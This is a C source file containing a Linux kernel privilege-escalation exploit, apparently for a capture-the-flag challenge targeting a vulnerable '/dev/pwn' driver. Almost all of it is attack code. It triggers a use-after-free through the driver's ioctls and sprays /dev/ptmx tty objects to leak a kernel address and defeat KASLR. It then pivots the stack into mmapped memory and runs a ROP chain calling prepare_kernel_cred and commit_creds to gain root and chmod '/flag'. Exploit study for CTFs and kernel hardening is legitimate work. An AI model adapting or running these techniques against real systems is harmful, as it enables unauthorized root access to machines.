#define _GNU_SOURCE
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/uio.h>
#include <syscall.h>
#include <stdio.h>
#include <pty.h>
#include <string.h>

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#define ALLOC_NUM (50)

int m_fd[50] = {0};
char sice[0x1000] = {0};

void * dst_addr = NULL;
void * src_addr = NULL;
size_t count = 0;

void *memcpy(void *dest, const void *src, size_t n) {
  while (n--)
    ((char*)dest)[n] = ((char*)src)[n];
  return dest;
}

void *memset(void *s, int c, size_t n) {
  while (n--)
    ((char*)s)[n] = c;
  return s;
}

void writes(const char *buf) {
  while (*buf) {
    write(1, buf, 1);
    buf++;
  }
}

const char nl = '\n';
void writeln(const char *buf) {
  writes(buf);
  write(1, &nl, 1);
}

const char *hex = "0123456789abcdef";
void ihex(int num) {
  char buf[9];
  for (int i = 0; i < 8; i++) {
    buf[7-i] = hex[num & 0xf];
    num >>= 4;
  }
  buf[8] = 0;
  write(1, buf, sizeof(buf));
  writeln("");
}
void lhex(uint64_t num) {
  char buf[17];
  writes("0x");
  for (int i = 0; i < 16; i++) {
    buf[15-i] = hex[num & 0xf];
    num >>= 4;
  }
  buf[16] = 0;
  write(1, buf, sizeof(buf));
  writeln("");
}

//// SYSCALLS
#define syscall(sysnum) ({ \
  register uint64_t rax asm("rax"); \
  asm volatile("movq %0, %%rax; call __syscall2" :: "i"(sysnum)); \
  rax; \
})

int64_t __syscall2();

int fork() {
  return (int)syscall(SYS_fork);
}

int execve(const char *filename, char *const argv[], char *const envp[]) {
  return (int)syscall(SYS_execve);
}

void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
  return (void *)syscall(SYS_mmap);
}

int open(const char *pathname, int flags, ...) {
  return (int)syscall(SYS_open);
}

ssize_t write(int fd, const void *buf, size_t count) {
  return (ssize_t)syscall(SYS_write);  
}

ssize_t read(int fd, void *buf, size_t count) {
  return (ssize_t)syscall(SYS_read);  
}

void exit(int status) {
  syscall(SYS_exit);
  __builtin_unreachable();
}

int ioctl(int fd, unsigned long req, ...) {
  return syscall(SYS_ioctl);
}

int nanosleep(const struct timespec *req, struct timespec *rem) {
  return syscall(SYS_nanosleep);
}

unsigned int sleep(unsigned int sec) {
  struct timespec req = {
    .tv_sec = sec,
    .tv_nsec = 0
  };

  nanosleep(&req, 0);
  return 0;
}

asm(\
"__syscall2: \n" \
"  push %rbp \n" \
"  movq %rcx, %r10 \n" \
"  movq 16(%rsp), %rbp \n" \
"  syscall \n" \
"  pop %rbp \n" \
"  ret\n" \
);


struct ioctl_param {
  uint64_t  vec_ct;
  struct iovec vecs[16];
  int ind;             
};

////// PWN FUNCTIONS

int pfd;

void bzero(void *data, uint64_t size) {
  while (size--) {
    ((char*)data)[size] = 0;
  }
}

void alloc(const void *data, uint64_t len) {
  struct ioctl_param pm = {
    .vec_ct = 1,
    .vecs = { 
      [0] = {(void*)data, len}
    }
  };
  
  ioctl(pfd, 6, &pm);
}

void edit(int ind, const void *data, uint64_t len) {
  struct ioctl_param pm = {
    .vec_ct = 1,
    .vecs = { 
      [0] = {(void*)data, len}
    },
    .ind = ind
  };
  
  ioctl(pfd, 666, &pm);
}

void dealloc(int ind) {
  ioctl(pfd, 6666, &ind);
}

void view(int ind, void *data, uint64_t len) {
  struct ioctl_param pm = {
    .vec_ct = 1,
    .vecs = { 
      [0] = {data, len}
    },
    .ind = ind
  };
  
  ioctl(pfd, 66, &pm);
}

void test();
asm("test: \n"
//"  iretq\n"
"  jmp test \n"
"  mov %rax, %rsp\n"
"  call get_root"
);

void get_root()
{
  while (1);
}

unsigned long user_cs, user_ss, user_rflags;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

struct  trap_frame64 {
    void*     rip;
    uint64_t  cs;
    uint64_t  rflags;
    void*     rsp;
    uint64_t  ss;
} __attribute__ (( packed ));

struct trap_frame64 tf;
struct trap_frame64 tf2;

void shell(){
    writeln("HACKED!!!!!!");
    //system("/bin/sh");
}

struct timespec64 {
  uint64_t tv_sec;
  uint64_t tv_nsec;
};

struct timespec64 long_time = {
  .tv_sec = 10000,
  .tv_nsec = 0,
};

void  prepare_tf(void) {
    asm(
        "xor %eax, %eax;"
        "mov %cs, %ax;"
        "pushq %rax;   popq tf+8;"
        "pushfq;      popq tf+16;"
        "pushq %rsp; popq tf+24;"
        "mov %ss, %ax;"
        "pushq %rax;   popq tf+32;"
    );
    tf.rip = &shell;
    tf.cs = 0x33;
    tf.rsp  -= 1024;   //  unused  part of  stack
}

#define KERNCALL __attribute__((regparm(3)))
typedef int KERNCALL (* commit_creds_t)(unsigned long cred);
typedef unsigned long KERNCALL (* prepare_kernel_cred_t)(unsigned long cred);

commit_creds_t commit_creds = NULL; // courtesy of kallsyms.
prepare_kernel_cred_t prepare_kernel_cred = NULL;

void payload() {
   commit_creds(prepare_kernel_cred(0));
   asm("movq $tf, %rsp; swapgs; iretq;");
}


void _start() {
	prepare_tf();

  pfd = open("/dev/pwn", O_RDONLY);
  char data[0x2e0] = {};

  char cont[0x2e0] = {};
  memset(cont, 0x41, 0x2e0);
  char cont2[0x2e0] = {0};
	
  // Allocate two things
  alloc(cont, 0x2e0);
  alloc(cont, 0x2e0);
  alloc(cont, 0x2e0);
  memset(sice, 0x41, 0x1000);
  //dealloc(1);

  //view(0, data, 8);
  //write(1, data, 8);


  // Now do UAF, with invalid pointer
  // Which will cause deallocation, but does not reset use bit
  //edit(0, 0, 8);
  edit(0, 0, 8);
  //edit(1, 0, 8);
  //edit(2, 0, 8);

  view(0, data, 0x2e0);
/*  for (int i = 0; i < 6; i += 8) {
    printf("%lx\n", *(long*)(data+i));
  }
  */
//  writes("got data:");
//  writeln(data);
  
  for (int i = 0; i < ALLOC_NUM; i++)
  {
	 m_fd[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
  }

  view(0, (char*)data, 0x2e0);
  void * leak = (*(void**)(data+0x18));
  writes("[+] leak : "); lhex((long)leak);
  char * text_base = ((char*)leak) - 0x10a3820;
  writes("[+] kernel text @ "); lhex((long)text_base);

  char * xchg_eax_esp= text_base + 0x1ebb7;
  writes("[+] pop rcx; ret; @ "); lhex((long)xchg_eax_esp);
//  char ** yeet = sice;
//  yeet[(0x60/8)] = push_rcx_ret;

  size_t target_addr = (size_t)(xchg_eax_esp) & 0xffffffff;
  size_t deet_target = (size_t)target_addr & ~0xFFF;
  char ** mmaped = mmap((void*)deet_target, 0x50000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  memset(mmaped, 0x41, 0x30000);
  mmaped[(0x60/8)] = xchg_eax_esp; 

  if (mmaped != (void*)deet_target)
  {
    writes("MMAP ERROR: "); ihex(-(int)(long)mmaped);
    exit(0);
  }


  write(1, (char*)data, 0x2e0);
  char * dice = &mmaped;
  writes("[+] Dice is at: "); lhex((long)dice);
  memcpy((char*)data+0x18, dice, 8);
  //char * mov_cr4_rdi_pop_rbp_ret = text_base + 0x707f4;
  char * pop_rcx_ret = text_base + 0x1ebe93;
  char * mov_cr4_rdi_pop_rbp_ret = text_base + 0x20480;
  char * pop_rdi_ret = text_base + 0x86800;
  char * rdmsr_garb = text_base + 0x0029bd; // rdmsr...
  char * root = &get_root;
  char * modprobe_path = text_base + 0x165bcc0;
  char * swapgs = text_base + 0x70894;
  commit_creds = text_base + 0xb9a00;
  prepare_kernel_cred = text_base + 0xb9db0;
  char ** mmapedd = (char*)mmaped + (target_addr & 0xfff);
  size_t idx = 0;
  char * iretq = text_base + 0x36bfb;
  char * pop_regs = text_base + 0x5cae85; // pop rax ; pop rdx ; pop rbx ; pop rbp ; ret
  char * wrmsr_pop = text_base + 0x6625b; // mov ebp, esp ; wrmsr ; pop rbp ; ret
  char * pop_regs2 = text_base + 0x01c37d; // pop rdi ; pop rsi ; pop rdx ; pop rcx ; pop rbp ; ret
  char * sleep = text_base + 0x11c300; // hrtimer_nanosleep

  char * pop_rsi_rdi_rbp_ret = text_base + 0x9f0862;
  char * mov_rdi_rax_pop_rbp_ret = text_base + 0x4d74cc;
  char * pop_rsi_ret = text_base + 0x10e261;

  char * chmod = text_base + 0x29f9c0; //0x29e314;
//  char * chmod = 0x1000180 + SYS_chmod * 8 + text_base;
//  char * chmod = 0x1974e0 + text_base;

//  mmapedd[idx++] = pop_rdi_ret;
//  mmapedd[idx++] = 0x6e0;
//  mmapedd[idx + 0] = swapgs;
//  mmapedd[idx + 1] = 0xdeadbeef; // popped rbp
//  mmapedd[idx++] = mov_cr4_rdi_pop_rbp_ret;
//  mmapedd[idx++] = 0xbabecaff; // popped rbp
//  mmapedd[idx++] = pop_rcx_ret;
//  mmapedd[idx++] = 0xC0000080;
//  mmapedd[idx++] = pop_regs;
//  mmapedd[idx++] = 0x501;
//  mmapedd[idx++] = 0x0;
//  idx+=2; // popped rbx, rbp
//  mmapedd[idx++] = wrmsr_pop;
//  mmapedd[idx++] = 0xdeadbeef; // popped rbp
//  mmapedd[idx++] = test;

//.text:FFFFFFFF8129F9C6                 movzx   edx, word ptr [rdi+68h]
//.text:FFFFFFFF8129F9CA                 mov     rsi, [rdi+70h]

  uint64_t args[2] = {0777, (uint64_t)"/flag"};
  char *fuck = (char*)args - 0x68;

  writeln("FUCK");
  lhex(*(uint64_t*)(fuck + 0x68));
  lhex(*(uint64_t*)(fuck + 0x70));

  // Escalate root
  mmapedd[idx++] = pop_rdi_ret;
  mmapedd[idx++] = 0;
  mmapedd[idx++] = prepare_kernel_cred;
  
  
  mmapedd[idx++] = pop_rsi_ret;
  mmapedd[idx++] = -1;
  mmapedd[idx++] = mov_rdi_rax_pop_rbp_ret;
  idx++; // popped rbp
  mmapedd[idx++] = commit_creds;

  // Chmod flag
  mmapedd[idx++] = pop_rdi_ret;
  mmapedd[idx++] = fuck;
  mmapedd[idx++] = chmod;
  //mmapedd[idx++] = 0xdeadbeef;

  // Call sleep
  mmapedd[idx++] = pop_regs2;
  mmapedd[idx++] = &long_time;
  mmapedd[idx++] = 1; // REL
  mmapedd[idx++] = 1; // MONOTONIC
  idx+=2; // popped rcx, rbp
  mmapedd[idx++] = sleep;
  mmapedd[idx++] = 0xdeadbeef;

//  mmapedd[idx + 4] = g;//payload;
//  mmapedd[idx + 0] = iretq;
//  mmapedd[idx + 0] = 0xdeadbeef;
//  memcpy(&mmapedd[idx + 1], &tf, sizeof(tf)); // trap frame

//  writes("ropchain at %p, bad shit at %p, iretq @ %p\n", mmapedd, swapgs,iretq);

//  sleep(1);

  edit(0, (char*)data, 0x2e0);
  view(0, (char*)data, 0x2e0);
  write(1, (char*)data, 0x2e0);

  for (int i = 0; i < ALLOC_NUM; i++)
  {
    ioctl(m_fd[i], 0, 0);
  }
  exit(0);
}
